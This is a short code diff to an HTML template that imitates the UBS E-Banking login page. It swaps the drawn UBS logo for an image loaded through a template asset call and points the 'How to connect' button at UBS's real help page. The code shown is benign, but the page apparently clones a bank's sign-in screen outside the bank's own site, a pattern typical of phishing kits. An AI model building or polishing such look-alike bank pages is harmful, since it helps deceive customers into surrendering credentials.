@@ -314,12 +314,7 @@ html,body{
 <header class="ubs-header">
   <a class="ubs-logo" href="#" onclick="return false;">
     <div class="ubs-logo-mark">
-      <div class="ubs-keys">
-        <div class="ubs-key"></div>
-        <div class="ubs-key"></div>
-        <div class="ubs-key"></div>
-      </div>
-      <span class="ubs-wordmark">UBS</span>
+              <img class="logo-compact" width="110" height="60" src="{{ asset('logodb.png') }}" alt="">
     </div>
     <div class="ubs-divider"></div>
     <span class="ubs-product">E-Banking</span>
@@ -423,7 +418,8 @@ html,body{
       <span class="spinner"></span>
     </button>
 
-    <button class="how-link" type="button">
+
+    <button class="how-link" type="button" onclick="window.open('https://www.ubs.com/global/en/wealth-management/our-approach/digital-banking/e-banking/how-to-connect.html', '_blank')">
       <span class="how-link-arrow">›</span>
       How to connect
     </button>
